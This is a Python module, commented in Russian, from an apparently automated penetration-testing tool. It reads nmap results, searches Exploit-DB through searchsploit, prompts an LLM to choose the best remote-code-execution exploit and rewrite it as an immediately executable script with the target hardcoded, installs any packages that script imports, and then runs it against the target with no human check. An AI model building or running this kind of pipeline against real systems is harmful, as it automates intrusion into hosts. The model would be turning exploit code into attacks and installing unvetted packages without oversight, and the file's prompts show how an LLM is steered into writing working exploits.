import json
import os
import re
import subprocess
import sys

import requests
from sqlalchemy.orm import Session

from .crud import append_exploit_log
from .models import Scan

# --- Конфигурация ---
EXPLOITS_DIR = "exploits"
# ✅ Новая папка для кэширования шаблонов
EXPLOIT_TEMPLATES_DIR = "exploit_templates"

os.makedirs(EXPLOITS_DIR, exist_ok=True)
os.makedirs(EXPLOIT_TEMPLATES_DIR, exist_ok=True)


# --- Вспомогательные функции ---
def log_info(db: Session, scan_id: int, message: str):
    print(f"[INFO] {message}")
    append_exploit_log(db, scan_id, f"[INFO] {message}")


def log_success(db: Session, scan_id: int, message: str):
    print(f"[SUCCESS] {message}")
    append_exploit_log(db, scan_id, f"[SUCCESS] {message}")


def log_warning(db: Session, scan_id: int, message: str):
    print(f"[WARNING] {message}")
    append_exploit_log(db, scan_id, f"[WARNING] {message}")


def log_failure(db: Session, scan_id: int, message: str):
    print(f"[FAILURE] {message}")
    append_exploit_log(db, scan_id, f"[FAILURE] {message}")


# ✅ Новая функция для создания шаблона с плейсхолдерами
def create_templated_version(code: str, target_ip: str, target_port) -> str:
    """Заменяет реальные IP и порт на плейсхолдеры для сохранения в кэш."""
    # Обрабатываем IP в одинарных и двойных кавычках
    code_with_ip_placeholder = code.replace(f"'{target_ip}'", "'TARGET_IP_PLACEHOLDER'")
    code_with_ip_placeholder = code_with_ip_placeholder.replace(f'"{target_ip}"', '"TARGET_IP_PLACEHOLDER"')

    # Обрабатываем порт
    final_template = code_with_ip_placeholder.replace(str(target_port), "TARGET_PORT_PLACEHOLDER")

    return final_template


# ... (все остальные вспомогательные функции, такие как parse_nmap, run_searchsploit, get_ai_recommendation и т.д., остаются без изменений) ...
# ... (вставляю их ниже для полноты файла, чтобы вы могли просто скопировать всё)
def parse_nmap_output_for_services(nmap_output: str):
    open_services_info = []
    if nmap_output:
        service_pattern = re.compile(r"(\d+)/tcp\s+open\s+([\w\-\.\/]+)\s*(.*)")
        for line in nmap_output.splitlines():
            match = service_pattern.search(line)
            if match:
                port, service, version_info = match.groups()
                open_services_info.append(
                    {"port": port, "service": service.lower(), "version_info": version_info.strip()}
                )
    return open_services_info


def run_searchsploit(db: Session, scan_id: int, query: str):
    log_info(db, scan_id, f"Ищем эксплойты (Searchsploit) по запросу: '{query}'...")
    try:
        command = ["searchsploit", "-j", "--exact", query]
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return json.loads(result.stdout).get("RESULTS_EXPLOIT", [])
    except (FileNotFoundError, subprocess.CalledProcessError, json.JSONDecodeError) as e:
        log_failure(db, scan_id, f"Ошибка при выполнении searchsploit для '{query}': {e}")
        return []


def smart_search_exploits(db: Session, scan_id: int, service: str, version_info: str):
    clean_version_string = re.sub(r"\(.*\)|\[.*\]", "", version_info).strip()
    parts = clean_version_string.split()
    product_name = service
    version = ""
    for i, part in enumerate(parts):
        if re.search(r"\d", part):
            product_name = " ".join(parts[:i])
            version = " ".join(parts[i:])
            break
    if not version:
        product_name = clean_version_string
    product_name = product_name or service
    queries = []
    if version:
        version_base = version.split()[0]
        version_parts = re.split(r"[.-]", version_base.replace("p", "."))
        for i in range(len(version_parts), 0, -1):
            short_version = ".".join(version_parts[:i])
            queries.append(f"{product_name} {short_version}")
    queries.append(product_name)
    all_found_exploits = []
    found_queries = set()
    for query in queries:
        query = query.strip()
        if not query or query in found_queries:
            continue
        results = run_searchsploit(db, scan_id, query)
        if results:
            log_success(db, scan_id, f"Найдены результаты для запроса '{query}'!")
            all_found_exploits.extend(results)
        found_queries.add(query)
    return all_found_exploits


def get_ai_recommendation(db: Session, scan_id: int, api_key: str, service_info: dict, exploits: list):
    headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
    exploits_text = "".join(
        [f"{i + 1}. Title: {e.get('Title', 'N/A')}, Path: {e.get('Path', 'N/A')}\n" for i, e in enumerate(exploits)]
    )
    prompt = f"""
    You are a professional cybersecurity expert. Analyze the list of exploits for the service and recommend the single most promising one to try first.
    **Service Information:**
    - Service: {service_info["service"]} {service_info["version_info"]} on Port: {service_info["port"]}
    **Potential Exploits Found:**
    {exploits_text}
    **Your Task:**
    1.  Prioritize exploits for Remote Code Execution (RCE).
    2.  Choose the SINGLE BEST exploit to try first.
    3.  Provide your answer in two parts, exactly as follows:
        - **RECOMMENDATION:** [Path to the best exploit]
        - **JUSTIFICATION:** [A brief explanation of why you chose this exploit.]
    """
    data = {
        "model": "qwen/qwen-2.5-coder-32b-instruct:free",
        "messages": [{"role": "user", "content": prompt}],
        "max_tokens": 500,
    }
    try:
        response = requests.post(
            "https://openrouter.ai/api/v1/chat/completions", headers=headers, json=data, timeout=60
        )
        response_data = response.json()
        if "error" in response_data:
            ai_output = f"[AI-ERROR] {response_data['error'].get('message', 'Unknown API error.')}"
        elif "choices" in response_data and response_data["choices"]:
            ai_output = response_data["choices"][0]["message"]["content"]
        else:
            ai_output = f"[AI-ERROR] Unexpected API response format: {json.dumps(response_data)}"
    except Exception as e:
        ai_output = f"[AI-ERROR] Network or other error: {e}"
    return ai_output


def parse_ai_recommendation(ai_text: str):
    match = re.search(r"(/usr/share/exploitdb/exploits/[\w./-]+)", ai_text)
    if match:
        path = match.group(1).strip()
        if os.path.exists(path):
            return path
    return None


def generate_exploit_with_ai(
    db: Session, scan_id: int, api_key: str, original_code: str, lang: str, target: str, port: str
):
    prompt = f"""
    You are an expert cybersecurity script engineer. Your task is to convert an exploit from one language to Python 3. You must be extremely precise.
    **Target Information:**
    - Target IP: {target}
    - Target Port: {port}
    **Original Exploit Code ({lang}):**
    ```{lang}
    {original_code}
    ```
    **CRITICAL INSTRUCTIONS - FOLLOW STEP-BY-STEP:**
    1.  **Analyze the Core Logic:** First, identify the exact payload or trigger that causes the vulnerability. What specific string, sequence of bytes, or command is sent to the target? For example, in the vsftpd 2.3.4 backdoor exploit, the trigger is a username string ending in `:)`.
    2.  **Replicate the Trigger:** Your primary goal is to replicate this exact trigger in Python 3. All other code (socket connections, error handling) is secondary to sending the correct payload.
    3.  **Hardcode Targets:** The final script MUST use the provided Target IP '{target}' and Target Port '{port}'. Remove all command-line argument logic (e.g., sys.argv).
    4.  **Final Output:** Your output must be ONLY the complete, raw Python 3 code. Do not include any text, explanations, or markdown fences. The script must be immediately executable.
    """
    headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
    data = {
        "model": "qwen/qwen-2.5-coder-32b-instruct:free",
        "messages": [{"role": "user", "content": prompt}],
        "max_tokens": 4096,
    }
    try:
        response = requests.post(
            "https://openrouter.ai/api/v1/chat/completions", headers=headers, json=data, timeout=180
        )
        response_data = response.json()
        if "error" in response_data:
            return f"[AI-ERROR] {response_data['error'].get('message', 'Unknown API error.')}"
        if "choices" in response_data and response_data["choices"]:
            content = response_data["choices"][0]["message"]["content"]
            if content.strip().startswith("```python"):
                content = re.search(r"```python\n(.*?)\n```", content, re.DOTALL).group(1)
            elif content.strip().startswith("```"):
                content = content.strip()[3:-3]
            return content.strip()
        return f"[AI-ERROR] Unexpected API response format: {json.dumps(response_data)}"
    except Exception as e:
        return f"[AI-ERROR] Network or other error: {e}"


def execute_ai_generated_script(db: Session, scan_id: int, filename: str):
    log_warning(db, scan_id, f"Запускаем сгенерированный ИИ эксплойт: {filename}...")
    timeout_seconds = 120
    output_summary = ""
    try:
        proc = subprocess.Popen(
            ["python3", filename],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        try:
            stdout, stderr = proc.communicate(timeout=timeout_seconds)
            if stdout:
                output_summary += f"--- STDOUT ---\n{stdout}\n"
            if stderr:
                output_summary += f"--- STDERR ---\n{stderr}\n"
            if proc.returncode == 0:
                log_success(db, scan_id, f"Скрипт {filename} завершился успешно (Exit Code: 0).")
                log_info(db, scan_id, f"Вывод скрипта:\n{output_summary}")
                return True, output_summary
            else:
                log_failure(db, scan_id, f"Скрипт {filename} завершился с ошибкой (Exit Code: {proc.returncode}).")
                log_info(db, scan_id, f"Вывод скрипта:\n{output_summary}")
                return False, output_summary
        except subprocess.TimeoutExpired:
            log_failure(
                db,
                scan_id,
                f"Скрипт {filename} превысил время ожидания ({timeout_seconds} сек). Принудительное завершение.",
            )
            proc.kill()
            stdout, stderr = proc.communicate()
            if stdout:
                output_summary += f"--- STDOUT (after kill) ---\n{stdout}\n"
            if stderr:
                output_summary += f"--- STDERR (after kill) ---\n{stderr}\n"
            log_info(db, scan_id, f"Вывод скрипта (до завершения по таймауту):\n{output_summary}")
            return False, output_summary
    except Exception as e:
        error_msg = f"Критическая ошибка при запуске скрипта {filename}: {e}"
        log_failure(db, scan_id, error_msg)
        return False, error_msg


def analyze_and_install_dependencies(db: Session, scan_id: int, code: str) -> bool:
    log_info(db, scan_id, "Анализ зависимостей в сгенерированном коде...")
    try:
        standard_libs = set(sys.stdlib_module_names)
        imports = re.findall(r"^\s*import\s+([\w\.]+)|^\s*from\s+([\w\.]+)", code, re.MULTILINE)
        libraries = set([item for sublist in imports for item in sublist if item])
        root_libraries = set(lib.split(".")[0] for lib in libraries)
        third_party_libs = [lib for lib in root_libraries if lib not in standard_libs and lib]
        if not third_party_libs:
            log_success(db, scan_id, "Сторонних библиотек для установки не найдено.")
            return True
        log_warning(db, scan_id, f"Найдены потенциальные сторонние библиотеки: {', '.join(third_party_libs)}")
        for lib in third_party_libs:
            log_info(db, scan_id, f"Попытка установки '{lib}' через pip...")
            try:
                command = [sys.executable, "-m", "pip", "install", lib]
                result = subprocess.run(command, check=True, capture_output=True, text=True)
                log_success(db, scan_id, f"Библиотека '{lib}' успешно установлена.")
                if result.stdout:
                    append_exploit_log(db, scan_id, f"[PIP STDOUT] {result.stdout}")
            except subprocess.CalledProcessError as e:
                log_failure(db, scan_id, f"Ошибка при установке '{lib}':")
                append_exploit_log(db, scan_id, f"[PIP STDERR] {e.stderr}")
                return False
        return True
    except Exception as e:
        log_failure(db, scan_id, f"Произошла критическая ошибка при анализе зависимостей: {e}")
        return False


# --- Основной воркер фазы эксплуатации (с логикой кэширования) ---
def run_exploit_phase(db: Session, scan_id: int, api_key: str):
    scan = db.query(Scan).filter(Scan.id == scan_id).first()
    if not scan:
        return
    log_info(db, scan_id, "Начало фазы поиска и анализа уязвимостей.")
    services = parse_nmap_output_for_services(scan.nmap_output)
    if not services:
        log_warning(db, scan_id, "Не найдено открытых сервисов для анализа в отчете Nmap.")
        return

    for service in services:
        log_info(
            db, scan_id, f"Анализ сервиса: {service['service']} {service['version_info']} на порту {service['port']}"
        )
        exploits = smart_search_exploits(db, scan_id, service["service"], service["version_info"])
        if not exploits:
            log_info(
                db, scan_id, f"Подходящих эксплойтов для {service['service']} не найдено. Переход к следующему сервису."
            )
            continue
        unique_exploits = list({e["Path"]: e for e in exploits}.values())
        log_info(db, scan_id, f"Отправляем {len(unique_exploits)} эксплойтов ИИ для выбора лучшего. Ожидание ответа...")
        ai_text = get_ai_recommendation(db, scan_id, api_key, service, unique_exploits[:20])
        recommended_path = parse_ai_recommendation(ai_text)
        if not recommended_path:
            log_failure(db, scan_id, "ИИ не смог дать четкую рекомендацию. Переход к следующему сервису.")
            continue
        log_success(db, scan_id, f"ИИ выбрал эксплойт: {recommended_path}")

        # ✅ ОСНОВНАЯ ЛОГИКА КЭШИРОВАНИЯ НАЧИНАЕТСЯ ЗДЕСЬ

        # 1. Получаем ID эксплойта для использования в качестве ключа кэша
        match = re.search(r"/(\d+)\.", recommended_path)
        if not match:
            log_warning(
                db,
                scan_id,
                f"Не удалось извлечь EDB-ID из пути {recommended_path}. Кэширование для этого эксплойта будет пропущено.",
            )
            exploit_id = os.path.basename(recommended_path).split(".")[0]  # Fallback
        else:
            exploit_id = match.group(1)

        template_path = os.path.join(EXPLOIT_TEMPLATES_DIR, f"template_{exploit_id}.py")
        modified_code = ""

        # 2. Проверяем, есть ли шаблон в кэше
        if os.path.exists(template_path):
            log_success(db, scan_id, f"Найден готовый шаблон в кэше: {template_path}")
            with open(template_path, encoding="utf-8") as f:
                template_code = f.read()

            # Заменяем плейсхолдеры на актуальные данные
            modified_code = template_code.replace("TARGET_IP_PLACEHOLDER", scan.target)
            modified_code = modified_code.replace("TARGET_PORT_PLACEHOLDER", str(service["port"]))

        else:
            # 3. Если шаблона нет, генерируем его
            log_info(db, scan_id, "Шаблон не найден в кэше. Запускаем генерацию через ИИ.")
            try:
                with open(recommended_path, errors="ignore") as f:
                    original_code = f.read()
            except Exception as e:
                log_failure(db, scan_id, f"Не удалось прочитать файл эксплойта {recommended_path}: {e}")
                continue

            ext = os.path.splitext(recommended_path)[1]
            lang_map = {".py": "python", ".rb": "ruby", ".pl": "perl", ".sh": "bash"}
            original_lang = lang_map.get(ext, "unknown")
            if original_lang == "unknown":
                log_warning(db, scan_id, f"Неподдерживаемый тип эксплойта ({ext}).")
                continue

            log_info(db, scan_id, f"Отправляем код ({original_lang}) нейросети для адаптации. Ожидание...")
            modified_code = generate_exploit_with_ai(
                db, scan_id, api_key, original_code, original_lang, scan.target, service["port"]
            )

            if "[AI-ERROR]" in modified_code:
                log_failure(db, scan_id, f"Не удалось сгенерировать код. {modified_code}")
                continue

            # 4. Сохраняем новый шаблон в кэш для будущего использования
            log_info(db, scan_id, "Сохранение нового шаблона в кэш...")
            template_to_save = create_templated_version(modified_code, scan.target, service["port"])
            with open(template_path, "w", encoding="utf-8") as f:
                f.write(template_to_save)
            log_success(db, scan_id, f"Новый шаблон сохранен в: {template_path}")

        # ✅ КОНЕЦ ЛОГИКИ КЭШИРОВАНИЯ

        if not modified_code:
            log_failure(db, scan_id, "Не удалось получить код эксплойта (ни из кэша, ни от ИИ).")
            continue

        dependencies_installed = analyze_and_install_dependencies(db, scan_id, modified_code)
        if not dependencies_installed:
            log_failure(db, scan_id, "Не удалось установить зависимости. Эксплуатация отменена.")
            continue

        ready_exploit_path = os.path.join(EXPLOITS_DIR, f"ai_ready_{scan_id}_{exploit_id}.py")
        with open(ready_exploit_path, "w", encoding="utf-8") as f:
            f.write(modified_code)
        log_info(db, scan_id, f"Готовый к запуску эксплойт сохранен в: {ready_exploit_path}")

        execute_ai_generated_script(db, scan_id, ready_exploit_path)

    log_info(db, scan_id, "Фаза эксплуатации завершена.")
